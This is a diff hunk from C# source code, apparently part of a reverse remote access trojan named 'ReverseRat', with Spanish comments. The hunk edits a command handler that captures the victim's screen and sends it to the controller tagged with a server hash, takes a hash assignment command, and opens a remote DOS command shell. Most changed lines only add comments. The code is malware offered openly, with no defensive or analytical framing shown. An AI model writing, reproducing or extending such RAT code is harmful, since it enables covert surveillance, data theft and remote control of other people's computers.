@@ -95,27 +95,27 @@ namespace ReverseRat
                     {
                         Cleanup(); // Cleanup para reiniciar Server
                     }
-                    if (EncuentraComando("exit")) // DOS Exit
+                    if (EncuentraComando("exit")) 
                     {
-                        _shell = false;                         
+                        _shell = false;   // DOS Exit               
                     }                                    
                     if (EncuentraComando("<:hola:>"))
                     {
-                        Utilidades.Hola();
+                        Utilidades.Hola();  // MessageBox de ejemplo
                     }
                     if (EncuentraComando("<:prueba:>"))
                     {
-                        EnviaDatos("PRUEBA DE ENVIO DE DATOS" + "|" +  Funciones.HashServer + "|");
+                        EnviaDatos("PRUEBA DE ENVIO DE DATOS" + "|" +  Funciones.HashServer + "|"); // Prueba
                     }
-                    if (EncuentraComando("<:captura:>"))
-                    { 
-                        EnviaDatos("<:imagen:>" + Utilidades.CapturarPantalla() + "<:imagen:>");
+                    if (EncuentraComando("<:captura:>")) // Captura de screenshot
+                    {  
+                        EnviaDatos("<:imagen:>" + Utilidades.CapturarPantalla() + "<:imagen:>" + Funciones.HashServer + "<:imagen:>");
                     }
                     if (EncuentraComando("<:asignahash:>"))
                     {
-                        Utilidades.AgregaHash(_strInput.ToString().Split(' ')[1].Trim());
+                        Utilidades.AgregaHash(_strInput.ToString().Split(' ')[1].Trim()); // Comando asignarhash
                     }                                           
-                    if (EncuentraComando("<:shell:>"))
+                    if (EncuentraComando("<:shell:>")) // Shell para DOS
                     {
                         _shell = true;
                         _processCmd = new Process();
